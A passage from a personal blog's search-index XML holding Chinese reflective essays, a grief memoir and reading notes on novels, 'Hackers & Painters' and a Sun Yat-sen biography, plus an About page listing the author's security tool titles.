朋友是个高尚的词，唯内心坦荡，灵魂共鸣的人可互相称呼。除此之外，它也别无要求。陌生人、情人、亲人之间都可能成为朋友，他们之间都可能拥有友情。但可能并不意味着容易。如果“三杯酒下肚就可以唤你朋友”那人人都应该酗酒。只是残酷的是，连李白这样金樽不曾空对月的人终其一生的朋友也屈指可数。其实我们可以感觉到，点头之交的背后是人际信任的日渐式微，是慵懒和畏惧的不断侵蚀。我们何尝未曾幻想让阳光温暖赤子之心，只是寒风烈烈，削肌切骨，我们终于还是用谎言和假笑裹起了自己，一点点地变成了他人眼中的地狱。我们肤浅地交往着，苟且地谈论着，面目可憎地踽踽独行着，又神情悲愤地感时伤世着。我们有了点赞转发评论这样虽缺乏诚意却不费心力，虽古怪畸形却蔚然成风的交往方式，便不再常常有饮茶话旧，把酒问月的真情。我们有了夸张扭曲却博人眼球的社交平台聊天表情后，只要手指灵活，各种面具转换自如，嬉笑怒骂更是信手拈来。低头是个八面玲珑的性情中人，抬头却是个面部僵硬的冷眼看客。富贵时誓同生死的称兄道弟回头来却是患难时避而远之的泾渭分明。我很早就已不信，世上还会有许多真正能为朋友两肋插刀而至死不渝的人，后来我又开始怀疑，这样的人真的能有幸遇见值得这份对待的彼此吗？ 亲人是大部分人一辈子的感动和羁绊。我们在漫天风雪里找到一间草庐，草庐里的人与我们共享维系生命的资源，我们彼此取暖，感激与爱护让我们紧紧相依，度过一个又一个短暂的冬天。我们忽远忽近，却不离不弃。我们始终没有离开草庐。被迫或胆敢离开的一小撮人也都接连死在了天地的肃杀中。我们更加不愿离开。一个又一个冬天过去了，我们依然没有离开。这让我不禁可耻地怀疑，这莫非是一个温柔的阴谋，一个甜蜜的枷锁。这样想着，我感到良心受着火烤一般。我又忍不住去问，孙悟空之所以是齐天大圣，莫不是因为他从石缝中出来？这样想着，我又感到无比地煎熬。毛主席说过，无情未必真豪杰。既然真豪杰都立如斯言，那我大概是杞人忧天了。 情人是寂寞最好的解药，也是世上最高明的毒药。荷尔蒙引起的快感虽不比海洛因，却也不失为一种很好的堕落。当女孩们白花花的大腿在我身旁耀眼地摇晃时，我感觉自己体内发生着一种奇异的变化，肾上腺素上去了，心不累了，神不乱了，难题不得解也不悲观厌世了。岁月是安平的，时光是静好的，阳光是温暖而不刺眼的，花儿是芳香而对我微笑的，屡试不第也愿意抱柱而死，天下纷乱只甘心化蝶双飞。我忍不住歌颂，忍不住赞美，忍不住向全世界夸耀这无与伦比的好东西。我也因此忘了我一点点流逝着的生命，好像一切可以永恒一样。我想这一定是上天赐予我的独一无二的恩宠，世上一定找不到第二样东西能让我那般快乐了。直到大腿们远去了。我陷入了深深的思考。我们所眷恋的，究竟是那一双双无比香艳的大长腿，还是那时的阳光和鲜花呢？如果换一双腿，我们会有同样的兴奋，还是有所谓情深缘浅的凄怆，抑或是比当时有过之而无不及的愉悦呢？柏拉图说，爱情是一种严重的精神疾病。那么治愈我们的究竟只能是她们还是恰好是她们呢？当我铿锵有力地质问完毕时，不禁感到内里空乏，底气不足，于是我红着脸在心里汪了两声。 鲁迅先生曾说，无尽的远方和无数的人们都和我有关。这真是一种浩瀚的真情啊。但我怀疑，那是些无数无尽的无所用心的对象。 日子很快，很多东西在变化，我自己也是，有时清醒，有时迷糊。每当问起自己这一生当如何度过，便又想起那句”陆然，你真的认为，在普通生活之外，还有更值得追求的东西吗？” ，接着就什么也想不起来。我不知道以后的自己会怎么想，正如已记不起过去的自己怎么想，所以唯一可做的就是，记下来当下的想法。但我知道这也是徒然，因为我已很难理解从前的自己偶有感触而兴致盎然地写下的东西。既然如此，那我们为什么还老想写点啥呢？因为毕竟，除此之外，还有什么，可以对抗，那不存在的敌人？]]></content>
      <categories>
        <category>随想</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[午后]]></title>
    <url>%2Fmind%2F160606Afternoon%2F</url>
    <content type="text"><![CDATA[四月的一个下午，五点左右，我醒过来，有点迷糊。我走上阳台，四下张望。天空有些阴沉，风有些湿热，涌上来的是莫名而熟悉的压抑，楼下人来人往。有姑娘在人群中不动，在等待什么？显然她不等我，我不认识她。她眼神努力寻找，等得多么认真。她双手抱胸，手和胸间是文件夹，文件夹里会是什么？她脚尖踢着石子，石子并不存在。她脚踝纤细，在碎花裙下格外好看。她的身体随碎花裙轻轻晃动，在晚风中有些动人。动人的不是裙子，不是身体，是人群和黄昏，是和世界擦肩而过的平凡一天。在三万多个日子里，如果女孩在一万个黄昏这样等待，会等来什么？会有多少个刚睡醒的我在头顶看她，会有多少次她猛然抬头，显露出被窥视的惊慌或是不以为意的微笑。如果我在一万个黄昏这样醒来，会看到什么？会有怎样不同的风景任我观瞻，又会有多少不痛不痒的思绪游荡在我脑海。]]></content>
      <categories>
        <category>随想</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[一塌糊涂]]></title>
    <url>%2Fmind%2F160501YiTaHuTu%2F</url>
    <content type="text"><![CDATA[《一塌糊涂》在继《晃晃悠悠》、《支离破碎》之后，我终于花了一整天时间完成了对石康青春三部曲中最后一部《一塌糊涂》的阅读。今天是二零一六年的劳动节，图书馆关了门，自习室少有人，大家都忙着去寻找乐趣了，然而于我而言，这一天与以往或是将来的任何一天不会有太大的分别。我在无所事事的心境下游荡，徘徊，找着一件能消磨时光又不那么令人厌恶的事情，一头扎进去，待到红日又西沉，感慨江水常东流。其实也算不得一整天。昨夜打球过度，回宿舍后疲惫不堪，甚至洗完澡也没有丝毫缓解，又作死与舍友一同订了双鸡堡与大鸡排。一行四人开着无关痛痒的玩笑，逗着重复而无新意的段子，偶尔冒出一两句有些愚蠢的俏皮话，一派其乐融融的景象。我不知道他们作何感想，反正我是感到极大的无趣，我不过是怕他们觉得无话可说的尴尬，若是独处，我是情愿终日无言的。吃过鸡排和汉堡，这垃圾食品满足了我短暂的口腹之欲，却在过后令我腹中有火烧之感，加上身体疲惫，不适感前所未有。吹干头发后连忙上床，企图通过睡眠缓解或是弥补这一切。说来睡眠真是好东西，它让我们耗散的精力得以填补，以此能够开始新的一日更加肆无忌惮、不知死活的耗散。有时睡醒后我总会想起王小波那句“以为自己会一直生猛下去”。其实我很难想象，但还是有些担心自己不能再生猛，不能再在打球时把地板跺得很响。嗯，虽然那种不适令我难以入眠，但没过多久，我还是睡着了。醒来已是九点半，我顿时被一种无所事事的感觉袭满全身。我不知道自己要干什么，要去哪里，我的价值在何处，我甚至无法确定自己的天赋。我只能看书，看各种书，或电影。企图从中找到一丝启发，一点安慰也好，渐渐的我发现那都没有什么用。我看得很慢，但忘得很快，我看到作者同我一样混乱的思路，不得要领的分析和草率的结论。也就是说，我基本一无所获。但我怎么会甘心呢，我还是得看啊，我得不断地试错。 于是一番来回走动后已是十二点多，我背上大书包，抄上《一塌糊涂》便踱着懒散的步子出发了。我打算先吃个饱饭来满足我的身体，再找个安静的地方安慰一下我的灵魂。我走在路上。路上人很少，我看到天空、白云、柏油路、绿树、青草、高大的建筑，我闻到花香、空气和美女。我走在路上，脑子里空空荡荡。我吃了个饭，脑子里空空荡荡。我现在看完了书，有很多想法捆在一起，毫无头绪，还不如空空荡荡。我这状态很糟，但我不希望别人觉得我亟待拯救或亟须向积极的方向改变。我执着地期待着，我应该有自己的出路。 石康在三十二岁左右，即二零零零年前后完成了三部曲的最后一部《一塌糊涂》。他说自己要把三部曲撕碎，抛在风中，并且到俗世里争取他应有的地位，去证明他应有的价值。而今十数年过去了，我不知道他近况如何，作何感想。是否在那一堆他看不上的人群中谋得一席之地。据说他近来出国了，希望他过得好吧。 其实本质上石康和我很相像，我总能在书中感受到一些似曾相识的想法或是一些还在孕育中的感悟。所以许多时候，我在阅读他时有种酣畅淋漓的快感。他出身普通，但热忱。我在完整地阅读过他的三部曲后对他的印象有了一个大致的概括。石康在一塌糊涂中多次强调自己能力不足以干大事，这也许源于他不自知的自卑，或许源于他透彻的自我解剖。但是实际上，一个人是无法完全认清自己的。我也很期待多少年后某一天，我听说石康，在某个名利场中一举拔得头筹，举世喝彩。虽然我们都知道这毫无意义，但还是蛮有意思的吧。 和以往两次一样，寂寞而迷茫的周文到处嗅蜜，也就是撩妹。周文虽有嘴皮，但社会背景不优，圈子小且简陋，关键是没有钱，所以成果总是不尽如人意。而且周文的价值体系里没有忠贞这两个字，他嗅蜜总不容易，但也从不珍惜。也许是本性所致，也许是太爱思考的缘故，他可能珍惜不起来。不管怎样，这次的女孩叫嗡嗡，爱撒娇，一年后的千禧年前夕，他们掰了。然后在继对道德、宗教、信念、真善美、自由意志、意识等感到绝望之后，周文抑或是石康终于放弃从爱情中寻找人生真相的慰藉。 文中处处，我看到一草《那时年少》的痕迹。他们都说，那时，有个女孩，相信有一种感情使人们永远在一起并且不会改变，但他们自己不相信，一草说，他撒了谎，石康说他不爱撒谎。但不论如何，在千禧年前后，苏扬和童小语，周文和嗡嗡，他们之间，结束了实质上的联系，而随之结束的是青春里的纯真和对爱情的信赖。 我没有体验过，只是觉得那很悲壮，或许我的信念只将在呜咽一声过后悄然湮灭，了无踪迹。 石康觉得自己很牛逼，整个文明史整了一遍后高声宣布：我最屌，他们都是傻逼。但在残酷的物质生活的直接压迫下，他也还是承认：我有些无能。其实，我虽然还未看遍文明史，但有时我又何尝不是处于这种矛盾的心理状态呢。 对于石康，我很欣赏，但也觉得可悲。对我自己，也是一样。如果有命运，我不知道命运会给这一类人什么出路。我们拭目以待吧，如果值得的话。 2016.5.1 于厦大 2017.8.30 凌晨 整理 于厦大]]></content>
      <categories>
        <category>读后感</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[黑客与画家]]></title>
    <url>%2Fmind%2F160430HackerAndPainter%2F</url>
    <content type="text"><![CDATA[我想问问有什么值得追求？昨天夜里十一时许，我在厦门大学上弦场完成了《黑客与画家》一书的阅读。彼时圆月当空，雾霾颇浓，四下人烟稀少，周遭空旷寂寥。我忽然觉得有点悲伤。想找一中问问，找南怀瑾问问，找佛陀问问，找老子问问，找庄子问问，找尼采问问，我这一生，究竟有什么值得追求？我不知道，真的不知道。 可其实我也知道，只是问问罢了。哪里有什么答案呢。一切真切地展现在我面前，了无意义，万般终成空。所唯一能做的，就是找一样物事，或某一个人，或一个念头，或某一种关系，沉醉进去，荒唐下去，以此终老。慢慢的，或许不甘，或许执着，最终要妥协。 如果有，或许技术算一种吧，但终归不那么热烈。 作者拥有独立的人格，这是应当学习的。在阅读的过程中给了我不少启迪。关于教育，关于思考，关于追求，他都有很独到的见解。这或许需要很长时间，很多的经历才有可能真正的了解，毕竟纸上得来终觉浅。我就是想的太多，做的太少吧。 近来感觉越发的辞不达意，言不成章，不知是浮躁了还是迷失了。可我一直都是浮躁和迷失的呀。那到底是怎么了呢？搞不懂。思来想去的有许多东西，可是下手写的时候却不知从何说起。我有时觉得他们所有人都很糟，有时觉得自己很糟，总之很少发现什么好的，这真像是一种病。为什么大多数人看起来都蛮开心的，他们没有困惑吗，还是他们解决了。为什么独独我常觉得失落，独独我难以走进人群呢？ 大多数时候我享受一个人，但有时我承认我感到寂寞，这可以忍受，独独难以忍受的是我所追求的看起来没有答案。 我不知道我还能坚持多久，但我确实在一点点离开自己的理想国度。我想走近生活，抛弃那个高傲冷漠的自己，也许我能走近，也许不能，也许我会明白，也许我会迷失，但无论如何，回来的都不再是我了。 ——————————————不知道写什么了。。。。。黑客与画家是我很愿意推荐的一本书 有空看看吧———就酱 夜深了 晚安世界 晚安阿威]]></content>
      <categories>
        <category>读后感</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[晃晃悠悠+支离破碎]]></title>
    <url>%2Fmind%2F160421WanderBroken%2F</url>
    <content type="text"><![CDATA[《晃晃悠悠》+《支离破碎》]]></content>
      <categories>
        <category>读后感</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[天下为公· 孙中山传]]></title>
    <url>%2Fmind%2F160421PeopleWorld%2F</url>
    <content type="text"><![CDATA[天下何时为公曩路遇老叟，皮皱发白，手足不便，惟目神炯炯。同车而行，吾见其好自语，絮絮不止。遂移坐，近之以私听。虽词句杂然，未贯而成章，吾稍得大旨。盖感于时世之明，当朝之治，青年之多能，复叹于昔时之落后，彼年生计之艰，国力之衰，并技术之穷乏。由是数称非孙文之革新无今日之中国，孙公真贤士也。吾一心阴听，不觉俯身倾耳，为叟所察，自觉失礼，手足口失其所安。不意老叟不吾怪，反执吾手，眉目慈蔼，类极祖考，一时心乱。内之愈乱，则外须愈静。吾亦不致歉，展萌态以对之，直视其目之炯炯。俄而叟曰:尔辈当多读中山之作，悉其大义，扬其明旨，成其伟业。言毕复絮絮自语，若从前状。 今幸有暇，寻其传记以拜读，有二三感，且一发而后快。 孙文，又名中山，德明，逸仙，曾化名中山樵，高野长雄，中山二郎等。或曰“天子命”，遂幼名帝象。果命由天定，运在自为，孙公存世一甲子，虽位近天子，然则命途多舛，终不得享其成，虽威扬天下，终止于国之公器，不得帝王四海，尽遂其愿。中山之鹄的固不在帝位，然则非帝王不能成易四海之事，非帝王不能改苍生之命，非帝王不能开愚民之智。人之所以伟者，在于众皆从之。伟人之所以成事者，在于众皆恒从之而无疑。欲使无疑，一曰权，二曰智。权须天赋，苍生俯首，智须神来，天下为虏。权易得而智难求，非权无以广智，非智无以成权，夫惟权、智具足，可成万古不刊之大业。此亦润之之所以王而中山之所以寇者也。 文幼有将帅之好，常自诩“洪秀全”，率群童模拟征战，野心初显，此类极拿破仑，盖斯属之人志悉发于少。十三岁出国投兄孙眉，有“始见轮舟之奇，沧海之阔，自是有慕西学之心，穷天地之想”之感。此年少之志，终不得践，西学有成而天地不可穷。西学亦不足以为穷天地之资。以故其半生飘零，似无头蝇，作意气事，败垂成功。二十六岁前，为学长才。此后二十年间，旅居海外，三民之论渐成体系，力彰己见，扬其名氏共思虑于四海，所凭惟口舌之利与不懈之心。欧美驱逐，伦敦蒙难，流离颠沛，其实可哀，而民智得稍启，有士同揭竿，亦足可慰。四十五岁，武昌起义，孙文坐食其果，所仗亦廿载飘零广告之功，彼时天下，舍文其谁？此乘天时也。 孙文素好毁其旧者，若夫何以建其新者，则思虑天真，略乏才智。向所欲毁者骤毁于前，文睹其残垣，不知何以立。破立之道，更迭之本也。破之易而立之难也。呕心沥血，寤寐难眠，不足以立，遂孙文拱手强权，袁贼取天下以反掌。天意使文徒具打砸之勇而无帝王之才，天意使黎民一场空喜，惨蒙驱虎引狼之灾，吾实痛心而不可奈何。一念误而添十年劳，亦必时之未至也。文终于草寇一生，天位留予后来人。 观文之生平，真可谓为国为民，鞠躬尽瘁。虽功不可没，吾为之一叹。其功在启民智，而不在易江山，卸磨，杀之。哽咽无言，亦复向之叹息，人皆为时、运、命所虏，不能自已，其实可哀。 吾以为，民智可开否诚不可知。苟可期，民智之开亦必速在庠序之教。民智得开则旧陈得破，贤者之聪方可立新。民智，贤者皆不易具，吾疑天下犹不系之舟，诚可怖也，实大惑也。破立之事，可速为乎？破立往复，可有不破之立？抑或不立之破？吾生而有涯，破立有涯乎？有径乎？皆尚不可知也。 吾亦时有穷天地之想，然则天地何在？前路莫非穷途？ 乙未年十一月]]></content>
      <categories>
        <category>读后感</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[遥远的救世主]]></title>
    <url>%2Fmind%2F160421FarawayChrist%2F</url>
    <content type="text"><![CDATA[遥远的救世主 在强者与弱者之间， 自己是一个多余的人！ 在道德与败坏之间， 自己是一个多余的人！ 世界太大了， 大得能包容罪恶、阴谋、眼泪…… 世界又太小了， 小得竟然没有他刘冰的一块立锥之地…… 他爬上窗户， 既像胜利者又像受了委屈的孩子一样 对着夜空大声喊道：“丁元英，你撒谎啦！你撒谎啦……” 然后纵身一跳。 接着，地面传来一声沉闷的声响。 ——《遥远的救世主》 本书通过一个主要故事试图向读者展示文化属性对于人生道路的主宰性作用并揭露了中华民族传统文化中倚赖和期待救世主的劣根性。 男主角是丁元英，一个游刃于经济领域，善于谋算的聪明人，一个精于佛道，追问人生究竟的觉者，一个沉默寡言，畏惧女人，不问功名的退隐者。 女主角是芮小丹，美女，有慧根，有佛性，也许算是降了丁元英。 丁从股市退出后到古城隐居，和芮相遇。芮爱上了丁并不顾一切地追求。丁被动地接受。两人讨论文化属性的问题。芮要丁为其写一个神话——帮助县城里的一个极度贫困村脱贫。也以此研究文化属性地优劣是否真的会带来那么巨大的影响。 丁利用市场竞争的边缘手段酿造了一个阴谋，帮助农民跻身资本市场。三个农村的年轻人作为分别代表这个实验的三个结果——冯世杰，有所觉悟。叶晓明，退回原地。叶冰，从井沿看了一眼更大的世界后掉回去的井底之蛙，同时得了精神绝症，成了这场失败实验的牺牲品，自杀。 归根结底，他们还是把丁元英看成了救世主，没有明白只有自救方能得救的道理。 基督教让他们靠上帝，佛教让他们靠佛恩，传统文化给了农民什么？谁来给农民做主？农民的得救之道在哪里？ 丁元英说：“传统文化是皇天在上的文化，是救主、救恩的文化。如果一个民族的文化从骨子里就是弱势文化属性，怎么可能去承载强势文化的政治、经济？衡量一种文化属性不是看它积淀的时间长短，而是看它与客观规律的距离远近。五千年的文化是光辉、是灿烂，这个没有问题。但是，传统和习俗得过过客观规律的筛子。” 这场实验的失败恰恰验证了丁的另一句话“不该作为的不作为就是作为”。 得救之道何在，这是个问题。一个一说就错的问题。 我想作者所说的救世主是客观规律。 丁元英说：“你自性本来，无需知道。这是根性的范畴，不是根器、智慧。我呢？就在那里参哪参哪，没完没了，越想活个明白就越不明白，一直参到了死胡同里出不来，就蹲在墙根打瞌睡。” 看来做一个晃晃悠悠的人没什么，只是要有足够的能力在这世间立足便是。 等我有钱了，就找个地方躲起来。▁▂▃▄▅▆▇█▇▆▅▄▃▂▁▁▂▃▄▅▆▇█▇▆▅▄▃▂▁☻…☺…☻…☺…☻…☺…☻…☺…▁▂▃▄▅▆▇█▇▆▅▄▃▂▁▁▂▃▄▅▆▇█▇▆]]></content>
      <categories>
        <category>读后感</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[孩子王]]></title>
    <url>%2Fmind%2F160419ChildKing%2F</url>
    <content type="text"><![CDATA[]]></content>
      <categories>
        <category>读后感</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[遗忘]]></title>
    <url>%2Fmind%2F141123WhyForget%2F</url>
    <content type="text"><![CDATA[遗忘我叫李忘，今年十八。在人们看来我是一个很糟糕的家伙，因为我总记不起昨日的承诺和明天的约定，记不起前夜的聚会和狂欢，也记不起信誓旦旦高谈阔论着的梦想与追逐。常人也会慢慢忘记很多东西，但我的遗忘功能似乎强大得多，相比之下，我更彻底地失去过去，以及那总想不起方向的未来。“无妨，不是还有现在吗？人们不是说把握现在比追忆过去和追逐未来更切实重要吗？”我常常这样安慰自己，又常常在安慰过后遗忘，继续像头猪一样在生活的泥沼中哼哼地打滚。 我想我可能是上帝的实验品。一般人一定想不起上个月或是去年今天那个早上穿的鞋是什么颜色的，但我则想不起昨天的这个时辰女友的声嘶力竭和泛红的眼眶是为了什么，也想不起早上看励志电影时从心底深处涌起的那股渴望与为梦想奋战的决心和激情。我是麻木的。我所追忆和留恋的绝非是甜蜜的爱情和闪光的理想，而是昨天在堕入时光之渊后留下的黑暗与茫然，以及这份茫然给予的无限酸涩；我所追逐与向往的也绝非是巅峰的事业与耀眼的光荣，而是明天在可悲地变成昨天之后我无法重拾的那份朦胧，以及随之而来的哀伤和祭奠。 我的每一个日子都是朝生暮死，我靠着生存惯性安然地活过了十八年。然而就在去年，我的惯性受到了撼动。死亡第一次接近我，我开始不得不直视它，认真地分析和评估它的力量。枯瘦如柴的老人斜斜地横在木板堆叠成的简易床铺上，上下眼皮被厚厚的眼屎相连，几乎看不见眼珠，我只是在眼角看到隐约闪烁的泪光。昏黄的灯下，孤陋的乡野，肆虐的风雨，哭嚎着的天地，老人就在这里，平静地结束了过去，也同时结束了现在和将来一切关于他的可能性。亲朋们远远地坐在厅堂里，各自神情冷漠，肃穆无言，只有我在床榻旁握着老人的手，直至最后一刻。感受着热量一点点离开这个生灵，我又想起了他惨淡而又执着的一生，他曾经苦苦追求的，难道就是这个结局，我真的不敢相信。擦干眼角，我木然地离开了房间，轻轻地说了句“走了”。一瞬间，惊愕，恐惧，茫然，释怀以及各种难以名状的情绪涌上每一个人的脸庞，但是更多的还是麻木，麻木，麻木，令我心痛而又无可奈何的麻木。然后，大家开始了早已准备停当的后续工作。而懦弱的我无法接受这一切，包括那已成俗礼的夸张的大哭。我裹着单衣，走进雨里，想陪他的灵魂最后一程。就此别了吧。从此以后，我们各自孤独，各自在各自的江湖里飘摇。只是，生者在流浪中老去，而死者，你永远年轻！ 我本以为自己能将所有的记忆像压低了声儿放屁一样悄悄搁置在我坐过的地方，然后了让它慢慢逸散开来，与天地相合，即使再尴尬地闻到也已与我无关，甚至可以捏着鼻子，摆出一副嫌恶的表情，自然地努努嘴叹一声“哎呀，真臭啊。”可是，那一幕始终在我的脑海里。一年多来，不管是学业还是人类引以为精神支柱的爱情，关于它们的一切我都可以迅速地遗忘。我在寻找着它们，它们也在寻找着我，只是我很清楚，我瞧不起它们，它们也瞧不起我。可是死亡不一样，我不找它，但它在找我，每天每时每刻进度条都在前进着，而且，必有那么一天，它会像水蛇一样柔柔地缠上我。然后在大脑一片空白时我陷入了永远的沉睡，不再醒来。那是比爱情更加销魂的毁灭，比成功更加诱人的沉沦。我想，有些时候，我真忍不住要歌颂你。 我终于清楚明白地了解了，那人们追忆着的昨日，和追逐的明天都不过是镜花水月，而我所追求的此刻的宁静和下一刻的彻底遗忘，才是生命最终的归宿，也是整个文明的最高依托。因为一切，都会涅没在黎明前最黑的黑暗里。对于破晓，我们那么接近，那么相信，但是不可能，不可能看到曙光。 我犹记得那个流浪在风雨里，为逝去的灵魂品尝泪水的夜里，我所看到的竹林。我想那摇曳的竹影和沙沙的哭声，便是所有生命最真实的写照和所有问题最终的答案。 谨此记2014年8月殁事。时2015年。]]></content>
      <categories>
        <category>随想</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[About]]></title>
    <url>%2Fabout%2Findex.html</url>
    <content type="text"><![CDATA[Explorer ; Student@XMU ; Blog since 2017/10 . Need a job/career related to cyber security . GitHub WECHAT EMAIL @findneo dlgbyhll moc.liamg@oendnifd Tiny jobs tools IP地址混淆器 kt.gy 即时编解码工具 WooyunDrops 为 MD 生成 TOC 快速爆破一句话 TK语录 Newbie-Security-List]]></content>
  </entry>
  <entry>
    <title><![CDATA[categories]]></title>
    <url>%2Fcategories%2Findex.html</url>
    <content type="text"></content>
  </entry>
  <entry>
    <title><![CDATA[tags]]></title>
    <url>%2Ftags%2Findex.html</url>
    <content type="text"></content>
  </entry>
</search>
